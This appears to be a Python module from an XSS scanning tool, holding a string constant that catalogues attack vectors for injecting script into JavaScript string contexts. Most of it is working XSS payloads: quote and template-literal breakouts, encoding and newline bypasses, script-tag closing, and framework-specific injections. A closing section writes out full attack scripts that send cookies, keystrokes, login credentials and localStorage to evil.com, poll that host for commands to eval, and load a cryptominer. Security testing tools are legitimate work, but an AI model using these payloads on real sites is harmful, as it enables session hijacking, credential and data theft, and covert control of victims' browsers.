#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

JavaScript String Context - Attack Vectors
"""

ATTACK_VECTOR = """
SINGLE QUOTE STRING BREAKOUT:

1. BASIC BREAKOUT:
   <script>var name = 'USER_INPUT';</script>
   
   Payloads:
   '; alert(1); var x='
   ' + alert(1) + '
   '-alert(1)-'
   
   Result:
   <script>var name = ''; alert(1); var x='';</script>

2. WITH COMMENT:
   Payload:
   '; alert(1);//
   
   Result:
   <script>var name = ''; alert(1);//';</script>
   (Original closing quote is commented out)

3. MULTILINE:
   Payload:
   ';\nalert(1);\nvar x='
   ';\ralert(1);\rvar x='

DOUBLE QUOTE STRING BREAKOUT:

4. BASIC BREAKOUT:
   <script>var msg = "USER_INPUT";</script>
   
   Payloads:
   "; alert(1); var x="
   " + alert(1) + "
   "-alert(1)-"
   
5. MIXED QUOTES:
   Payload in single quote context:
   ' + alert(1) + "
   
   Payload in double quote context:
   " + alert(1) + '

ES6 TEMPLATE LITERAL EXPLOITATION:

6. TEMPLATE LITERAL INJECTION:
   <script>var msg = `Hello USER_INPUT`;</script>
   
   Payloads:
   ${alert(1)}
   ${document.cookie}
   ${fetch('//evil.com?c='+document.cookie)}
   ${eval(atob('YWxlcnQoMSk='))}
   ${constructor.constructor('alert(1)')()}
   ${this.constructor.constructor('alert(1)')()}
   
   Result:
   <script>var msg = `Hello ${alert(1)}`;</script>

7. NESTED TEMPLATE LITERALS:
   ${`nested ${alert(1)}`}
   ${`${`${alert(1)}`}`}

8. TEMPLATE WITH EXPRESSIONS:
   ${(()=>alert(1))()}
   ${[].constructor.constructor('alert(1)')()}

9. BREAKING OUT OF TEMPLATE:
   Payload:
   `; alert(1); var x=`
   ` + alert(1) + `
   
   Result:
   <script>var msg = `Hello `; alert(1); var x=``;</script>

UNICODE AND ENCODING BYPASSES:

10. UNICODE ESCAPES:
    Payloads:
    \\u0027; alert(1); var x=\\u0027  (\\u0027 = ')
    \\u0022; alert(1); var x=\\u0022  (\\u0022 = ")
    \\u0061lert(1)  (\\u0061 = 'a')
    
    In code:
    <script>var x = '\\u0027; alert(1); //';</script>

11. HEX ESCAPES:
    \\x27; alert(1); var x=\\x27  (\\x27 = ')
    \\x22; alert(1); var x=\\x22  (\\x22 = ")
    \\x61lert(1)  (\\x61 = 'a')

12. OCTAL ESCAPES:
    \\047; alert(1); var x=\\047  (\\047 = ')
    \\042; alert(1); var x=\\042  (\\042 = ")
    \\141lert(1)  (\\141 = 'a')

13. MIXED ENCODING:
    \\x27+\\u0061lert(1)+\\x27
    \\u0027;\\x61lert(1);\\u0027

LINE CONTINUATION AND NEWLINE ATTACKS:

14. BACKSLASH LINE CONTINUATION:
    Payload:
    \\\nalert(1)//
    
    Becomes:
    <script>var x = '\\\nalert(1)//';</script>
    
    JavaScript interprets \\\n as line continuation

15. CRLF INJECTION:
    Payload:
    \\r\\nalert(1);//
    \\n'; alert(1); var x='\\n
    
    Result:
    <script>var x = '\\n'; alert(1); var x='\\n';</script>

16. LINE SEPARATOR (U+2028):
    Payload:
    \u2028alert(1)//
    
    JavaScript treats U+2028 as newline but many filters don't

17. PARAGRAPH SEPARATOR (U+2029):
    Payload:
    \u2029alert(1)//

CLOSING SCRIPT TAG ATTACKS:

18. SCRIPT TAG INJECTION:
    <script>var x = 'USER_INPUT';</script>
    
    Payload:
    </script><script>alert(1)</script><script>
    
    Result:
    <script>var x = '</script><script>alert(1)</script><script>';</script>
    
    First script closes, new script executes

19. WITH COMMENT BYPASS:
    Payload:
    </script><script>alert(1)//
    
    Prevents syntax error

20. CASE VARIATIONS:
    </ScRiPt><script>alert(1)</script>
    </SCRIPT><script>alert(1)</script>

HTML COMMENT ATTACKS:

21. HTML COMMENT IN JAVASCRIPT:
    Payload:
    '--></script><script>alert(1)//
    '<!--</script><script>alert(1)//
    
    HTML comments can affect JavaScript parsing in some contexts

REGEX CONTEXT EXPLOITATION:

22. BREAKING OUT OF REGEX:
    <script>var pattern = /USER_INPUT/;</script>
    
    Payloads:
    /; alert(1); var x=/
    /+ alert(1) +/
    []/;alert(1);var x=/[]/
    
    Result:
    <script>var pattern = //; alert(1); var x=//;</script>

23. REGEX WITH FLAGS:
    <script>var pattern = /USER_INPUT/gi;</script>
    
    Payload:
    /;alert(1);var x=/gi;var y=/
    
    Result:
    <script>var pattern = //;alert(1);var x=/gi;var y=/gi;</script>

INLINE EVENT HANDLER CONTEXT:

24. ONCLICK WITH SINGLE QUOTES:
    <button onclick="doSomething('USER_INPUT')">
    
    Payload:
    '); alert(1); doSomething('
    
    Result:
    <button onclick="doSomething(''); alert(1); doSomething('')">

25. ONMOUSEOVER WITH DOUBLE QUOTES:
    <div onmouseover="alert(\"USER_INPUT\")">
    
    Payload:
    \\"); alert(1); alert(\\"
    
    Result:
    <div onmouseover="alert(\\"\\"); alert(1); alert(\\"\")">

TOSTRING() COERCION ATTACKS:

26. OBJECT TO STRING:
    If attacker can control object that gets stringified:
    
    Payload object:
    {toString: function() { return "'; alert(1); var x='"; }}
    
    When used in:
    <script>var x = 'USER_OBJECT';</script>
    
    Object's toString() is called

27. ARRAY TO STRING:
    [1,2,3] becomes "1,2,3" when stringified
    Can exploit if concatenated into strings

EXPLOITATION TECHNIQUES:

28. PROTOTYPE POLLUTION VIA STRING:
    If string manipulation is vulnerable:
    
    Payload:
    __proto__
    constructor[prototype]
    
    Can lead to prototype pollution and XSS

29. EVAL() IN STRING:
    <script>var code = 'eval("USER_INPUT")';</script>
    
    Payload:
    alert(1)
    
    Double evaluation vulnerability

30. FUNCTION() CONSTRUCTOR:
    <script>var fn = new Function('return "USER_INPUT"');</script>
    
    Payload:
    "; alert(1); return "
    
    Result:
    new Function('return ""; alert(1); return ""')

JSON STRING EXPLOITATION:

31. JSON IN JAVASCRIPT:
    <script>var config = '{"key": "USER_INPUT"}';</script>
    
    Payloads:
    ", "exploit": "alert(1)
    "}; alert(1); var x='{"key": "

32. JSONP STRING INJECTION:
    callback('{"data": "USER_INPUT"}')
    
    Payload:
    "}); alert(1); callback({"data": "

STRING CONCATENATION ATTACKS:

33. PLUS OPERATOR ABUSE:
    Payload:
    ' + alert(1) + '
    " + alert(1) + "
    
    Result:
    <script>var x = 'test' + alert(1) + 'test';</script>

34. COMMA OPERATOR:
    Payload:
    ', alert(1), '
    
    Result:
    <script>var x = ('test', alert(1), 'test');</script>

35. TERNARY OPERATOR:
    Payload:
    ' + (1?alert(1):0) + '

FRAMEWORK-SPECIFIC ATTACKS:

36. EJS TEMPLATE:
    <script>var msg = '<%= userInput %>';</script>
    
    If not properly escaped:
    '; alert(1); var x='

37. HANDLEBARS:
    <script>var msg = '{{userInput}}';</script>
    
    Payload:
    {{#with this}}'; alert(1); var x='{{/with}}

38. JINJA2:
    <script>var msg = '{{ user_input }}';</script>
    
    If auto-escape is off:
    '; alert(1); var x='

REAL-WORLD ATTACK SCENARIOS:

SESSION HIJACKING:
<script>
var username = 'attacker'; fetch('//evil.com?c='+document.cookie); var x='victim';
</script>

KEYLOGGER:
<script>
var data = ''; document.onkeypress=function(e){fetch('//evil.com?k='+e.key)}; var x='';
</script>

CREDENTIAL THEFT:
<script>
var msg = ''; 
document.body.innerHTML='<form action=//evil.com><input name=user placeholder=Username required><input name=pass type=password placeholder=Password required><button>Login</button></form>';
var x='';
</script>

DATA EXFILTRATION:
<script>
var config = ''; 
fetch('//evil.com/exfil',{method:'POST',body:JSON.stringify({
  cookies:document.cookie,
  localStorage:JSON.stringify(localStorage)
})});
var x='';
</script>

PERSISTENT BACKDOOR:
<script>
var temp = '';
setInterval(()=>{
  fetch('//evil.com/cmd').then(r=>r.text()).then(cmd=>eval(cmd))
},5000);
var x='';
</script>

CRYPTOCURRENCY MINING:
<script>
var user = '';
var s=document.createElement('script');
s.src='//evil.com/coinhive.js';
document.head.appendChild(s);
setTimeout(()=>{new CoinHive.Anonymous('key').start()},1000);
var x='';
</script>
"""

